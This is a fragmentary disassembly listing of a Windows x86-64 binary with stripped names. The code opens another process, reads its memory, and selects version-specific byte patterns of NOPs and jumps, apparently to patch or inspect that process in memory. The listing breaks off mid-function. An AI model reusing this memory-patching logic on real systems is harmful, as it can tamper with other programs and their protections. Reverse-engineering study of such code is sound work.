mov [ rbp - 0x28 ] r14w
xor r13b r13b
mov ecx 0x20
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
add rdx rcx
mov rdx r14
jmp r-xdata
mov rcx rdx
shr rcx 0x1
sub rbx rcx
cmp rbx rdx
jae r-xdata
cmp [ rbp + 0xe8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x80 ]
mov rdi r14
mov [ rax ] r14
mov [ rax + 0x8 ] r14
mov [ rax + 0x10 ] r14
jmp r-xdata
cmp rdx rax
cmovb rdx rax
lea rcx [ rsp + 0x38 ]
call sub_14001ade0
mov rcx [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
add rdx rcx
mov rdx r14
jmp r-xdata
mov [ rbp + 0xe8 ] 0x7
mov [ rbp + 0xe0 ] r14
mov [ rbp + 0xd0 ] r14w
cmp [ rbp + 0xc0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xd0 ]
call j_sub_14003ad04
test rdi rdi
je r-xdata
mov rbx [ rdi ]
cmp rbx [ rdi + 0x8 ]
je r-xdata
lea rdx [ rbp + 0x6c ]
mov rcx rdi
call sub_14000c590
test al al
je r-xdata
cmp rdx rax
cmovb rdx rax
lea rcx [ rsp + 0x38 ]
call sub_14001ade0
mov rcx [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
mov [ rbp + 0xc0 ] 0x7
mov [ rbp + 0xb8 ] r14
mov [ rbp + 0xa8 ] r14w
cmp [ rbp + 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xa8 ]
call j_sub_14003ad04
test r13b r13b
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
nop [ rax ] eax
mov [ rbp + 0x40 ] 0x7
mov [ rbp + 0x38 ] r14
mov [ rbp + 0x28 ] r14w
cmp [ rbp + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x28 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x80 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
mov rbx [ rbp - 0x68 ]
mov edi [ rbp - 0x60 ]
mov r8d [ rbp + 0x6c ]
xor edx edx
lea ecx [ rdx + 0x38 ]
call [ OpenProcess@IAT ]
mov r14 rax
test rax rax
je r-xdata
mov [ rdi ] r14
mov [ rdi + 0x8 ] r14
mov [ rdi + 0x10 ] r14
mov rcx rdi
call j_sub_14003ad04
mov rdx [ rdi + 0x8 ]
call sub_14000de60
mov rcx [ rdi ]
call j_sub_14003ad04
lea r12 [ rbx + 0x30 ]
mov r12 [ rbx + 0x30 ]
jmp r-xdata
mov rcx [ rbp ]
call j_sub_14003ad04
nop
cmp [ rbp - 0x10 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x80 ]
call j_sub_14003ad04
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x80 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
xor r12d r12d
mov [ rsp + 0x30 ] r12
lea rdx [ rbx + rdi ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x5
lea r9 [ rsp + 0x30 ]
lea r8 [ rbp + 0xf8 ]
mov rcx rbx
call sub_1400069a0
test al al
je r-xdata
mov eax [ rbx ]
mov [ rbp - 0x80 ] eax
mov eax [ rbx + 0x4 ]
mov [ rbp - 0x7c ] eax
mov eax [ rbx + 0x8 ]
mov [ rbp - 0x78 ] eax
mov eax [ rbx + 0xc ]
mov [ rbp - 0x74 ] eax
mov eax [ rbx + 0x10 ]
mov [ rbp - 0x70 ] eax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x68 ] rax
mov eax [ rbx + 0x20 ]
mov [ rbp - 0x60 ] eax
mov rax [ rbx + 0x28 ]
mov [ rbp - 0x58 ] rax
lea rdx [ rbx + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp - 0x50 ]
call sub_140001dd0
lea rdx [ rbx + 0x58 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp - 0x28 ]
call sub_140001dd0
mov r13b 0x1
sub rbx 0xffffffffffffff80
cmp rbx [ rdi + 0x8 ]
jne r-xdata
lea rcx [ rbp + 0xd0 ]
call sub_140001bd0
mov rdx rax
mov rcx r12
call sub_14003bad0
test eax eax
je r-xdata
mov [ rbp - 0x10 ] 0x7
mov [ rbp - 0x18 ] r14
mov [ rbp - 0x28 ] r14w
cmp [ rbp - 0x38 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x28 ]
call j_sub_14003ad04
xor r14d r14d
mov rcx [ rbp + 0x80 ]
call j_sub_14003ad04
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x80 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
mov [ rbp + 0xf8 ] r12d
mov rdi [ rsp + 0x30 ]
lea rdx [ rdi - 0x4 ]
cmp r14 0xffffffffffffffff
jne r-xdata
cmp [ rbx + 0x48 ] 0x8
jb r-xdata
jmp r-xdata
mov rcx [ rbp - 0x50 ]
jmp r-xdata
mov rcx r14
call [ CloseHandle@IAT ]
jmp r-xdata
mov rcx [ rbp + 0x80 ]
call j_sub_14003ad04
mov [ rsp + 0x30 ] r12
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x4
lea r8 [ rbp + 0xf8 ]
mov rcx r14
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov eax 0x4
mov r9d eax
mov r8 rdx
mov edx eax
lea rcx [ rbp + 0xf8 ]
call sub_14003b740
test eax eax
sete al
jmp r-xdata
call j_sub_14003ad04
nop
xor al al
cmp [ rsp + 0x30 ] 0x4
jne r-xdata
movsxd rbx [ rbp + 0xf8 ]
add rbx rdi
mov [ rsp + 0x60 ] rbx
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x80 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
mov rax rbx
mov [ rsp + 0x30 ] rbx
lea r13 [ rw-data ]
nop [ rax + rax ] eax
mov al 0x1
jmp r-xdata
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
mov [ rsp + 0x58 ] r12
lea rcx [ rsp + 0x58 ]
mov [ rsp + 0x20 ] rcx
lea r8 [ rsp + 0x30 ]
mov rdx rax
mov rcx r14
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov r8 rax
mov edx r9d
lea rcx [ rsp + 0x30 ]
call sub_14003b740
test eax eax
sete al
test al al
je r-xdata
mov rax [ rsp + 0x30 ]
cmp rax rbx
jne r-xdata
cmp [ rsp + 0x58 ] 0x8
jne r-xdata
jmp r-xdata
mov r9d 0x8
cmp r14 0xffffffffffffffff
jne r-xdata
jmp r-xdata
cmp [ rsp + 0x30 ] rbx
je r-xdata
mov ecx 0x24a0
call sub_14003ac60
mov r12 rax
test rax rax
je r-xdata
xor r12d r12d
xor edx edx
mov r8d 0x24a0
mov rcx rax
call sub_14003d760
jmp r-xdata
mov rcx r12
call j_sub_14003ad04
xor r12d r12d
mov rax [ rsp + 0x70 ]
test rax rax
je r-xdata
mov r9 r14
mov r8d 0x24a0
mov rdx r12
mov rcx [ rsp + 0x30 ]
call sub_140006810
movzx r15d al
test al al
je r-xdata
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx [ rsp + 0x30 ]
call sub_140023170
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx [ r12 + 0x8 ]
call sub_140023170
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx [ r12 ]
call sub_140023170
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov edx [ r12 + 0x30 ]
call sub_140008400
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
lea rdx [ r12 + 0x34 ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
lea rdx [ r12 + 0x1d80 ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
lea rdx [ r12 + 0x1dc2 ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov edx [ r12 + 0x2498 ]
lea rcx [ rbp + 0x80 ]
call sub_140030340
mov rbx rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov edx [ r12 + 0x2498 ]
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
mov ecx [ rax ]
cmp [ r12 + 0x30 ] ecx
jne r-xdata
mov rbx [ rsp + 0x68 ]
test rbx rbx
je r-xdata
mov rcx [ rbp + 0x80 ]
call j_sub_14003ad04
mov edx 0xa
mov rcx r13
call sub_1400085e0
xor ebx ebx
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r13 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x30 ]
add rcx 0x2498
mov r9 r14
mov r8d 0x4
mov rdx rbx
call sub_140006890
movzx r15d al
mov edx [ rbx ]
lea rcx [ rbp + 0x80 ]
call sub_140030340
mov rbx rax
lea rdi [ r--data ]
test r15b r15b
lea rax [ r--data ]
cmovne rdi rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx [ rsp + 0x68 ]
mov edx [ rdx ]
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r13
test ebx ebx
je r-xdata
mov rcx [ rcx + r13 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove ebx eax
mov rax [ rw-data ]
mov rcx [ rbp + 0x80 ]
call j_sub_14003ad04
mov rbx [ rsp + 0x60 ]
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_140030050
mov rax rsp
push rbp
push r13
push r14
lea rbp [ rax - 0x138 ]
sub rsp 0x220
mov [ rsp + 0x78 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x110 ] rax
mov [ rsp + 0x44 ] 0x7f02f883
mov [ rsp + 0x40 ] 0x9090
mov [ rbp + 0xd8 ] 0x638818b
mov [ rbp + 0xdc ] 0x81390000
mov [ rbp + 0xe0 ] 0x63c
mov [ rbp + 0xe4 ] 0x75
mov [ rbp + 0xc8 ] 0x63c81c7
mov [ rbp + 0xcc ] 0xffff0000
mov [ rbp + 0xd0 ] 0x90907fff
mov [ rbp + 0xd4 ] 0xeb
mov [ rbp + 0xe8 ] 0x638878b
mov [ rbp + 0xec ] 0x87390000
mov [ rbp + 0xf0 ] 0x63c
mov [ rbp + 0xf4 ] 0x840f
mov [ rbp + 0xf8 ] 0x63c87c7
mov [ rbp + 0xfc ] 0xffff0000
mov [ rbp + 0x100 ] 0x90907fff
mov [ rbp + 0x104 ] 0x90909090
mov [ rbp + 0x108 ] 0x9090
xor edx edx
mov r8d 0x11c
lea rcx [ rbp - 0x80 ]
call sub_14003d760
mov [ rbp - 0x80 ] 0x11c
lea rcx [ rbp - 0x80 ]
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xa0 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xb8 ] 0x8
jb r-xdata
xor r14d r14d
mov eax [ rbp - 0x7c ]
cmp eax 0x5
jne r-xdata
mov al 0x1
mov rcx [ rbp + 0x110 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x220 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop rbp
retn
mov rcx [ rbp + 0xa0 ]
call j_sub_14003ad04
cmp eax 0x6
jne r-xdata
lea rdi [ rsp + 0x44 ]
lea ebx [ rax - 0x1 ]
lea rsi [ rsp + 0x40 ]
lea r12d [ r14 + 0x2 ]
lea r13d [ r14 + 0x3 ]
jmp r-xdata
mov ebx 0x2e
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov edx [ rbp - 0x7c ]
call sub_140008400
mov rcx rax
movzx edx bx
call sub_14000fe50
mov rcx rax
mov edx [ rbp - 0x78 ]
call sub_140008400
mov rcx rax
call sub_140007970
jmp r-xdata
mov eax [ rbp - 0x78 ]
test eax eax
jne r-xdata
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] r14
mov [ rsp + 0x48 ] r14w
mov r8d 0xb
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_140001ea0
nop
mov [ rbp + 0xb8 ] 0x7
mov [ rbp + 0xb0 ] r14
mov [ rbp + 0xa0 ] r14w
mov r8d 0xb
lea rdx [ r--data ]
lea rcx [ rbp + 0xa0 ]
call sub_140001ea0
mov eax r12d
mov r9d ebx
mov [ rsp + 0x30 ] r13d
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rsi
mov r8 rdi
lea rdx [ rsp + 0x48 ]
lea rcx [ rbp + 0xa0 ]
call sub_1400079e0
jmp r-xdata
cmp eax 0x1
jne r-xdata
lea rdi [ rbp + 0xd8 ]
mov ebx 0xd
lea rsi [ rbp + 0xc8 ]
mov r12d ebx
jmp r-xdata
lea rdi [ rbp + 0xe8 ]
lea ebx [ rax + 0xd ]
lea rsi [ rbp + 0xf8 ]
lea r12d [ rax + 0x11 ]
mov r13d r14d
sub_140030340
push rbx
sub rsp 0x20
xor eax eax
mov [ rcx + 0x18 ] 0x7
mov rbx rcx
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
mov [ rsp + 0x38 ] eax
test edx edx
je r-xdata
lea rdx [ r--data ]
mov r8d 0x7
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
dec edx
je r-xdata
lea rdx [ r--data ]
mov r8d 0x17
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
dec edx
je r-xdata
lea rdx [ r--data ]
mov r8d 0xe
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
dec edx
je r-xdata
lea rdx [ r--data ]
mov r8d 0x13
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
dec edx
je r-xdata
lea rdx [ r--data ]
mov r8d 0xa
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
lea r8d [ rax + 0x1 ]
lea rdx [ r--data ]
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_140030420
push rbx
sub rsp 0x20
xor r8d r8d
mov rbx rcx
mov [ rsp + 0x38 ] r8d
cmp edx 0x9
ja r-xdata
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0x1
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
lea rcx [ __dos_header ]
mov eax edx
mov edx [ rcx + rax * 4 + 0x3064c ]
add rdx rcx
jmp rdx
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0x6
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0x9
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0xc
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0x6
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0xc
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0x4
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0x6
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0x5
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0x4
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x10 ] r8
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] r8w
lea rdx [ r--data ]
mov r8d 0x4
mov rcx rbx
call sub_140001ea0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_140030690
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rsi [ rcx ]
xor r12d r12d
mov rdi rcx
test rsi rsi
je r-xdata
mov rsi [ rsp + 0x40 ]
mov [ rdi ] r12
mov [ rdi + 0x8 ] r12
mov [ rdi + 0x10 ] r12
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov [ rsp + 0x38 ] rbp
mov rbp [ rcx + 0x8 ]
cmp rsi rbp
je r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov rbp [ rsp + 0x38 ]
mov [ rsp + 0x30 ] rbx
lea rbx [ rsi + 0x20 ]
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] r12
add rsi 0x30
mov [ rbx - 0x18 ] r12w
add rbx 0x30
cmp rsi rbp
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
cmp [ rbx ] 0x8
jb r-xdata
mov rbx [ rsp + 0x30 ]
sub_140030720
mov rax rsp
push rbp
lea rbp [ rax - 0x138 ]
sub rsp 0x230
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x120 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_140030c60 ]
mov [ rbp ] rax
mov esi 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x8 ] di
mov rcx [ r--data ]
mov [ rbp + 0x8 ] rcx
mov [ rbp + 0x18 ] 0x4
lea rax [ rbp + 0x8 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0x8 ] di
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x11 ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea r11 [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae r11 [ rbp + 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
movzx eax [ r--data ]
mov [ r11 + 0x20 ] ax
mov [ rbp + 0x40 ] 0x11
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0x22 ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140031160 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x48 ] di
mov rcx [ r--data ]
mov [ rsp + 0x48 ] rcx
mov eax [ r--data ]
mov [ rsp + 0x50 ] eax
movzx eax [ r--data ]
mov [ rsp + 0x54 ] ax
mov [ rsp + 0x58 ] rsi
lea rax [ rsp + 0x48 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xe ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x17 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea r11 [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae r11 [ rsp + 0x70 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov eax [ r--data ]
mov [ r11 + 0x28 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x2c ] ax
mov [ rbp - 0x80 ] 0x17
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x2e ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140030f40 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x58 ] di
mov rcx [ r--data ]
mov [ rbp - 0x58 ] rcx
mov eax [ r--data ]
mov [ rbp - 0x50 ] eax
mov [ rbp - 0x48 ] 0x6
lea rax [ rbp - 0x58 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xc ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x1a ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea r11 [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae r11 [ rbp - 0x30 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov eax [ r--data ]
mov [ r11 + 0x30 ] eax
mov [ rbp - 0x20 ] 0x1a
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x34 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140031380 ]
mov [ rbp + 0xc0 ] r11
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
lea r8d [ rdi + 0x4 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xc8 ]
call sub_140001ea0
nop
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
lea r8d [ rdi + 0x10 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0xc0 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_1400315a0 ]
mov [ rbp + 0x60 ] r11
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
lea r8d [ rdi + 0x4 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea r8d [ rdi + 0x29 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x90 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf0 ]
call j_sub_14003ad04
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x120 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x230 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_140030c60
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
mov rbx rcx
mov r14d 0x20
mov ecx r14d
call sub_14003ac60
mov rbp rax
xor esi esi
test rax rax
je r-xdata
mov rbp rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x20 ] esi
jmp r-xdata
mov rcx [ rbx ]
cmp rcx [ rbx + 0x8 ]
jne r-xdata
call sub_14003d01c
mov [ rsp + 0x20 ] eax
mov rcx [ rcx ]
mov rax [ rbx + 0x8 ]
cmp [ rbx ] rax
sete al
lea rdx [ rsp + 0x20 ]
test al al
